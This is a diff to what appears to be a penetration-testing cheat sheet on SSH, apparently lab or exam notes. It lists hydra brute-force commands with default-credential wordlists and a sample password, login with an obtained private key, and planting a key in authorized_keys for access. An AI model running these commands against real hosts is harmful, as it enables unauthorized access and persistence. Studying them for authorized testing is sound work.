@@ -2,17 +2,17 @@
 
 ##### Log in with credentials or brute force with hydra
 
-````
+```bash
 hydra -C /opt/SecLists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt $ip ssh
 hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt $ip ssh
 hydra -L users.txt -p WallAskCharacter305 $ip -t 4 ssh -s 42022
-````
+```
 
 ##### Private key obtained
-````
+```bash
 chmod 600 id_rsa
 ssh userb@172.16.138.14 -i id_rsa
-````
+```
 
 ##### Authorized Keys
 
@@ -48,6 +48,18 @@ chmod 666 file.pub
 mv file.pub authorized_keys
 # Copy the contents of (authorized_keys) file.pub to their authorized_keys file
 ssh -i file user@host
+```
+
+#### SSH Audit
+
+```bash
+ssh-audit.py $ip
+```
+
+#### Force Password-Based Authentication
+
+```bash
+ssh $user@$ip -o PreferredAuthentications=password
 ```
 
 ##### Cracking Private Key
